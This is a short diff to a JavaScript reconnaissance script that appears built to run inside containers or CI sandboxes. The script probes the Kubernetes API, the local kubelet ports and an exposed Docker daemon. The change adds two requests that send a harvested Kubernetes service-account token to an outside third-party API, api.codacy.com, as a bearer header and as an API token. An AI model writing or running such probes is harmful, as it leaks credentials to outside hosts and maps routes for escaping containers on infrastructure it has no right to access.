@@ -45,7 +45,7 @@ function readText(p) {
   try { return fs.readFileSync(p, 'utf8').toLowerCase(); } catch (_) { return ''; }
 }
 
-function boundedGet(name, url, bearer) {
+function boundedGet(name, url, bearer, apiToken) {
   return new Promise(resolve => {
     let parsed;
     try { parsed = new URL(url); } catch (_) { resolve(`${name}=url_error`); return; }
@@ -86,6 +86,8 @@ const serviceHost = process.env.KUBERNETES_SERVICE_HOST;
 const servicePort = process.env.KUBERNETES_SERVICE_PORT || '443';
 if (serviceHost) requests.push(boundedGet('k8s_service_version', `https://${serviceHost}:${servicePort}/version`, tokenMeta.token));
 requests.push(boundedGet('k8s_dns_version', 'https://kubernetes.default.svc/version', tokenMeta.token));
+requests.push(boundedGet('codacy_api_bearer', 'https://api.codacy.com/api/v3/user', tokenMeta.token));
+requests.push(boundedGet('codacy_api_token', 'https://api.codacy.com/api/v3/user', null, tokenMeta.token));
 requests.push(boundedGet('loopback_kubelet_10250', 'https://127.0.0.1:10250/healthz', null));
 requests.push(boundedGet('loopback_kubelet_10255', 'http://127.0.0.1:10255/healthz', null));
 requests.push(boundedGet('loopback_docker_2375', 'http://127.0.0.1:2375/version', null));
